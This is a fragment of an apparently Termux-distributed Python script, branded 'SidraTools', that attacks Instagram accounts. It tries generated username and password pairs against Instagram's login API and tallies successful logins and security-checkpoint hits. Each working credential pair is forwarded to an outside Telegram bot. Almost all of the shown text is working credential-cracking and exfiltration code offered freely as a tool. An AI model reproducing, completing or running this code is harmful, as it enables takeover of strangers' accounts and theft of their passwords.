...
\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m > \033[1;91m⌯ \033[1;90mversion1.0  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
...
def Cod_Sidra_telegram(bot_message):
    ...
    global R , Y , user , pass1 , pass2 , token , ID 
    bot_token = token
    bot_chatID = ID
	...
	def main(arg):
		...
		try:
			...
			if str("logged_in_user") in login.text:
				ok+=1
				Cod_Sidra_telegram(" ⌯ Instagram Successful ✓ ⌯ \n. — — — — —  — — — — — .\n⌯ Username : " +str(Y)+str(R)+str(user)+"\n⌯ Password : " +str(pass1)+"\n. — — — — —  — — — — — .\n ⚖️ Tele : @SidraTools")
				...
				if str('"message":"challenge_required","challenge"') in login.text:
					cp+=1
					Cod_Sidra_telegram(" ⌯ Instagram security ⌯ \n. — — — — —  — — — — — .\n⌯ Username : " +Y+R+user+"\n⌯ Password : " +str(pass1)+" \n. — — — — —  — — — — — .\n ⚖️ Tele : @SidraTools")
					print '\033[1;90m [INSTA-CP] ' + Y + R + user + ' | ' + pass1+'\n'+"\n"
				else:
					pass2="0"+R+user
					uid = str(uuid4())
					url = "https://i.instagram.com/api/v1/accounts/login/"
					...
					if str("logged_in_user") in log.text:
						...
						if str('"message":"challenge_required","challenge"') in log.text:
							...
							Cod_Sidra_telegram(" ⌯ Instagram security  ⌯ \n. — — — — —  — — — — — .\n⌯ Username : " +Y+R+user+"\n⌯ Password : " +str(pass2)+" \n. — — — — —  — — — — — .\n ⚖️ Tele : @SidraTools")
							print '\033[1;90m [INSTA-CP] ' + Y + R + user + ' | ' + pass2+'\n\n'
